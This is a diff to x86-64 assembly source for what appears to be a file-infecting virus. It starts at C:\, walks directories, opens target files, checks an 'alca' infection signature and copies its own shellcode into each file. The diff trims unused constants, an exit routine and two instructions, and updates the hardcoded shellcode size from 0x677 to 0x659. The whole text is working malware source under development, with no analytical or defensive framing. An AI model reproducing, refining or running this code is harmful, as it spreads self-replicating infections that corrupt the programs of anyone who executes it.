@@ -112,12 +112,6 @@ _resources:
 
 	dir			db	"C:\", 0
 
-	GEN_READ_GEN_WRITE	dq	0x00000000C0000000
-
-	OPEN_ALWAYS		db	4
-
-	FILE_ATTRIBUTE_NORMAL	dd	0x00000080
-
 	dotdot			db	"..", 0
 
 	signature		db	"alca", 0
@@ -480,7 +474,7 @@ _openCurrentFile:
 	xchg 	rdi, r13			; *** r13 : size of target file ***
 	push 	r12
 	xor 	r12, r12
-	add 	r12, 0x677 			; *** r12: size of this shellcode (hardcoded) ***
+	add 	r12, 0x659 			; *** r12: size of this shellcode (hardcoded) ***
 	xchg 	r14, rdi 
 	pop 	r14				; *** r14: HANDLE hFile ***
 	xor 	rdi, rdi 			; *** rdi: 0 ***
@@ -576,12 +570,6 @@ _copyShellcode1:
 	jmp	_findNextFile
 
 
-; can delete _exit procedure
-_exit:
-	xor 	rcx, rcx
-	call 	QWORD [ds:r15 + 16]			; ExitProcess(0)
-
-
 ;-----------------------------------------------------------------;
 ; The _freeCall procedure is needed when an invalid file is found ;
 ;-----------------------------------------------------------------;
@@ -593,9 +581,6 @@ _freeCall:
 
 
 _prepareChangeDirectory_prepareExit:
-	; can delete the following 2 instructions
-	cmp 	r12, 2
-	jz	_clearAndTerminate
 
 ;---------------------------------------------------;
 ; Check if we're in 'directory mode' (r12 == 1)     ;
